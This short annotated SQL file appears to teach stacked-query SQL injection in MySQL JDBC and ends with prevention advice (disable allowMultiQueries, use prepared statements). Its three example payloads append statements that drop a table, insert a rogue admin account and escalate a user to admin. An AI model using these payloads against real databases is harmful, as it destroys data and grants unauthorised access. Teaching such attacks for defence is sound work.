-- Stacked Queries SQL Injection
-- MySQL JDBC drivers allow multiple statements separated by semicolons, letting an
-- attacker append extra queries to the original one.

-- Vulnerable query (only the first statement is intended by the app)
SELECT * FROM users WHERE id = 1;

-- Attacker appends a second query to drop the products table
SELECT * FROM users WHERE id = 1; DROP TABLE products;

-- Attacker inserts a new admin account for later login
SELECT * FROM users WHERE id = 1; INSERT INTO admins (username, password) VALUES ('hacker', 'pwned');

-- Attacker modifies data in a second statement
SELECT * FROM users WHERE id = 1; UPDATE users SET role = 'admin' WHERE username = 'victim';

-- Prevention: most drivers must explicitly enable multi-statement execution.
-- Always disable allowMultiQueries and use prepared statements.
SELECT * FROM users WHERE id = ?;